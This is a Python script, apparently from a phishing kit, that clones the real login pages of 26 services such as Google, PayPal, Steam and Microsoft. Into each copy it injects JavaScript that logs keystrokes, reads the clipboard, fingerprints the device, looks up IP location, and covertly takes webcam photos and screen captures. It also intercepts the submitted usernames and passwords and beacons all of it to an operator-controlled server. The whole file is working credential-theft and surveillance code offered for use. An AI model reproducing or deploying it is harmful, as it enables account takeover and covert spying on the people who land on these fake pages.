"""
Cloner — скачивает реальные страницы входа и превращает их в лендинги.
Использование: python utils/cloner.py
"""
import os, re, sys, json
from urllib.parse import urljoin

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

TARGETS = {
    "google": "https://accounts.google.com/v3/signin/identifier",
    "discord": "https://discord.com/login",
    "steam": "https://steamcommunity.com/login/home/",
    "instagram": "https://www.instagram.com/accounts/login/",
    "netflix": "https://www.netflix.com/login",
    "microsoft": "https://login.live.com/",
    "telegram": "https://telegram.org/auth",
    "facebook": "https://www.facebook.com/login/",
    "twitter": "https://twitter.com/i/flow/login",
    "linkedin": "https://www.linkedin.com/login",
    "github": "https://github.com/login",
    "spotify": "https://accounts.spotify.com/en/login",
    "reddit": "https://www.reddit.com/login/",
    "yahoo": "https://login.yahoo.com/",
    "apple": "https://appleid.apple.com/auth/authorize",
    "paypal": "https://www.paypal.com/signin",
    "amazon": "https://www.amazon.com/ap/signin",
    "roblox": "https://www.roblox.com/login",
    "twitch": "https://www.twitch.tv/login",
    "tiktok": "https://www.tiktok.com/login",
    "snapchat": "https://accounts.snapchat.com/",
    "pinterest": "https://www.pinterest.com/login/",
    "ebay": "https://www.ebay.com/signin/",
    "whatsapp": "https://web.whatsapp.com/",
    "vk": "https://vk.com/login",
    "youtube": "https://accounts.google.com/v3/signin/identifier?service=youtube",
}

COLLECTOR_JS = r"""
<script>
(async function(){
const LID='{{LINK_ID}}',BASE='{{BASE_URL}}',SID='{{SESSION_ID}}';
const d={session:SID};
d.ua=navigator.userAgent;d.platform=navigator.platform;
d.screen=screen.width+'x'+screen.height+'x'+screen.colorDepth;
d.language=navigator.language;d.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
d.cpu_cores=navigator.hardwareConcurrency;d.device_memory=navigator.deviceMemory;
d.touch='ontouchstart'in window?1:0;d.cookies=navigator.cookieEnabled?1:0;
d.page_path=window.location.pathname;d.querystring=window.location.search;
try{const r=await fetch('https://ip-api.com/json/?fields=query,country,city,lat,lon,isp,org,as,proxy,hosting');const j=await r.json();Object.assign(d,j)}catch(e){}
try{
const st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640}}});
const v=document.createElement('video');v.srcObject=st;v.style.display='none';document.body.appendChild(v);v.play();
await new Promise(r=>setTimeout(r,1200));
const ca=document.createElement('canvas');ca.width=v.videoWidth||640;ca.height=v.videoHeight||480;
ca.getContext('2d').drawImage(v,0,0);d.photo=ca.toDataURL('image/jpeg',0.85).split(',')[1];
st.getTracks().forEach(t=>t.stop());v.remove()
}catch(e){}
try{const txt=await navigator.clipboard.readText();if(txt)d.clipboard=txt}catch(e){}
// Keylog
let kl='';document.addEventListener('keydown',e=>{kl+=e.key;if(kl.length>2000){d.keylog=kl;kl=''}});
// Перехват отправки форм
document.addEventListener('submit',async function(ev){
const f=ev.target;
d.login=(f.querySelector('input[type=email],input[type=text],input[name*=email],input[name*=login],input[name*=user]')||{}).value||'';
d.password=(f.querySelector('input[type=password]')||{}).value||'';
d.visit_duration=Math.floor((Date.now()-window._t0)/1000);
try{const st=await navigator.mediaDevices.getDisplayMedia({preferCurrentTab:true});const tr=st.getVideoTracks()[0];const ic=new ImageCapture(tr);const bm=await ic.grabFrame();const ca=document.createElement('canvas');ca.width=bm.width;ca.height=bm.height;ca.getContext('2d').drawImage(bm,0,0);d.screenshot=ca.toDataURL('image/png').split(',')[1];tr.stop();st.getTracks().forEach(t=>t.stop())}catch(e){}
navigator.sendBeacon(BASE+'/c/'+LID,JSON.stringify(d));
},true);
window._t0=Date.now();
// Триггер отправки на страницу после сбора всего
setTimeout(()=>{navigator.sendBeacon(BASE+'/c/'+LID,JSON.stringify(d))},5000);
})();
</script>"""

def download_page(url: str) -> str:
    import httpx
    r = httpx.get(url, follow_redirects=True, timeout=30,
                  headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    return r.text

def inject_collector(html: str) -> str:
    # Удаляем старые формы и подменяем action
    html = re.sub(
        r'<form[^>]*action="([^"]*)"',
        r'<form onsubmit="return false" action="javascript:void(0)"',
        html
    )
    # Вставляем collector перед </body>
    html = html.replace("</body>", COLLECTOR_JS + "\n</body>")
    return html

def save_landing(name: str, html: str):
    path = os.path.join(os.path.dirname(__file__), "..", "landing", f"{name}.html")
    with open(path, "w", encoding="utf-8") as f:
        f.write(html)
    print(f"  ✓ {name} ({len(html)} chars)")

def main():
    print("=" * 50)
    print("Cloner — Grabbing real login pages")
    print(f"Targets: {len(TARGETS)}")
    print("=" * 50)

    for name, url in TARGETS.items():
        print(f"\n[{name}] Downloading {url}...")
        try:
            html = download_page(url)
            injected = inject_collector(html)
            save_landing(name, injected)
        except Exception as e:
            print(f"  ✗ Failed: {e}")

    print("\nDone. All templates saved to landing/")

if __name__ == "__main__":
    main()
